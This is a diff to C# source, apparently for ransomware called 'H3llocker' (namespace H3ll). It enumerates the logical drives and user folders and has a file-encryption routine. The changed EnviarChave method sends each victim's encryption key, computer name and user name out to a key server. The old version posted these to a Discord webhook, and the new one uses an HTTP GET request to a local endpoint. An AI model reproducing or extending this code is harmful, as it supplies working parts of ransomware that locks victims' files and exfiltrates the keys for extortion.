@@ -20,7 +20,7 @@ namespace H3ll
         private static string computerName = System.Environment.MachineName.ToString();
         private static string userFolder = "C:\\Users\\";
         private static string[] allDrives = System.IO.Directory.GetLogicalDrives();
-        private static string webhookUrl = "https://discord.com/api/webhooks/1149061974831939606/SUA-WEBHOOK";
+        private static string serverUrl = "http://127.0.0.1:1337/chave";
 
         static void Main(string[] args)
         {
@@ -138,20 +138,23 @@ namespace H3ll
 
         public static void EnviarChave(string password)
         {
-            string combined = "Cliente: " + computerName + "-" + username + "  -  Chave: " + password;
-
-            // --------
-            using (WebClient client = new WebClient())
+            using (HttpClient client = new HttpClient())
             {
-                NameValueCollection payload = new NameValueCollection()
+                string queryString = $"?password={password}&computerName={computerName}&username={username}";
+                string requestUrl = serverUrl + queryString;
+                HttpResponseMessage response = client.GetAsync(requestUrl).Result;
+                if (response.IsSuccessStatusCode)
                 {
-                    { "content", "@everyone H3llocker logs  -  "+combined }
-                };
-                byte[] responseBytes = client.UploadValues(webhookUrl, "POST", payload);
-                string response = System.Text.Encoding.UTF8.GetString(responseBytes);
+                    string responseBody = response.Content.ReadAsStringAsync().Result;
+                    Console.WriteLine("Resposta do servidor: " + responseBody);
+                }
+                else
+                {
+                    Console.WriteLine("Erro ao enviar a requisição. Código de status: " + response.StatusCode);
+                }
             }
-            // --------
         }
+
 
         public static void EncryptArq(string fileName, string password)
         {
